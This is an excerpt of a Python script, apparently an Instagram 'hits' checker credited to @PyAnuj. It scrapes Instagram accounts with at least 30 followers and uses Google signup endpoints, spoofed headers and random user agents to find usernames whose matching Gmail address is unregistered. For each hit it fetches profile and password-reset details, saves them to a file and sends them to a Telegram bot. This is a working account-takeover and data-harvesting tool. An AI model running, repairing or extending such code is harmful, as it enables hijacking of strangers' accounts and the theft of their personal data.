...
class InstagramTool:
    def __init__(self):
        self.GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
        self.GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
        self.REFERRER_HEADER = 'referer'
        self.ORIGIN_HEADER = 'origin'
        self.AUTHORITY_HEADER = 'authority'
        self.CONTENT_TYPE_HEADER = 'Content-Type'
        self.COOKIE_HEADER = 'Cookie'
        self.USER_AGENT_HEADER = 'User-Agent'
        self.CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
        self.CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
        self.TOKEN_FILE = 'files.txt'
        self.sldomain = '@gmail.com'
        self.total_hits = 0
        self.hits = 0
        self.bad_insta = 0
        self.bad_email = 0
    ...
    def check_instagram_email(self, mail):
        try:
 ...
 {self.Y}  {self.Y}[ ✓ ]  𝐇𝐢𝐭          :  {self.hits}
 {self.S}  {self.S}[ ✓ ]  𝐆𝐎𝐎𝐃 𝐌𝐀𝐈𝐋    :  {self.good_ig}
 {self.K}  {self.K}[ ✗ ]  𝐁𝐚𝐝 𝐌𝐚𝐢𝐥     :  {self.bad_insta}
 ...
 ═══════════════════════════════════════════════════════    \r"""
    ...
    def instatool(self):
        try:
            ...
            headers = {
                ...
                self.CONTENT_TYPE_HEADER: self.CONTENT_TYPE_FORM_ALT,
                'google-accounts-xsrf': '1',
                self.USER_AGENT_HEADER: str(generate_user_agent())
            }
            recovery_url = (f"{self.GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
            ...
            headers2 = {
                self.AUTHORITY_HEADER: self.GOOGLE_ACCOUNTS_DOMAIN,
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                self.CONTENT_TYPE_HEADER: self.CONTENT_TYPE_FORM_ALT,
                'google-accounts-xsrf': '1',
                self.ORIGIN_HEADER: self.GOOGLE_ACCOUNTS_URL,
                self.REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                                      '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
                self.USER_AGENT_HEADER: generate_user_agent()
            }
            data = {
            ...
            response = requests.post(f"{self.GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
    ...
    def check_gmail(self, email):
        ...
        try:
            ...
            headers = {
                ...
                'google-accounts-xsrf': '1',
                self.ORIGIN_HEADER: self.GOOGLE_ACCOUNTS_URL,
                self.REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                self.USER_AGENT_HEADER: generate_user_agent()
            }
            params = {'TL': tl}
            ...
            response = pp(f"{self.GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                          params=params, cookies=cookies, headers=headers, data=data)
            if '"gf.uar",1' in response.text:
                self.hits += 1
                self.update_stats()
                full_email = email + self.sldomain
                username, domain = full_email.split('@')
                self.technologia(username, domain)
            else:
                self.bad_email += 1
                self.update_stats()
        except Exception:
    ...
    def check(self, email):
        try:
            ...
            email_exists = self.check_instagram_email(email)
            
            if email_exists:
                
                if self.sldomain in email:
    ...
    def rest(self, user):
        try:
            ...
            reset_info = self.get_reset_info(user)
            return reset_info
        except Exception as e:
            return f"Reset Error: {str(e)}"
    ...
    def technologia(self, username, domain):
        account_info = self.iginfo.get(username, {})
...
║  📸  𝐏𝐨𝐬𝐭𝐬      :  {posts}
║  📝  𝐁𝐢𝐨        :  {bio}
║  🔐  𝐑𝐞𝐬𝐞𝐭       :  {self.rest(username)}
╠══════════════════════════════╣
║      by: @PyAnuj | @itz_4nuj1                ║
╚══════════════════════════════╝
"""
        with open('anujhits.txt', 'a') as f:
            f.write(adh + "\n")
        try:
            requests.get(f"https://api.telegram.org/bot{self.TOKEN}/sendMessage?chat_id={self.ID}&text={adh}")
        except Exception:
            pass
        ...
        while True:
            ...
            try:
                ...
                if username:
                    ...
                    if followers < 30 : 
                        continue
                    self.iginfo[username] = account
                    emails = [username + self.sldomain]
                    for email in emails:
                        self.check(email)
            except Exception:
                pass
    ...
    def run(self):
        anuj = render('{Anuj}', colors=['yellow', 'blue'], align='center')
        print(f'''\n
                              {anuj}
                    ╔══════════════════════════════╗
                    ║  Developer: @PyAnuj          ║
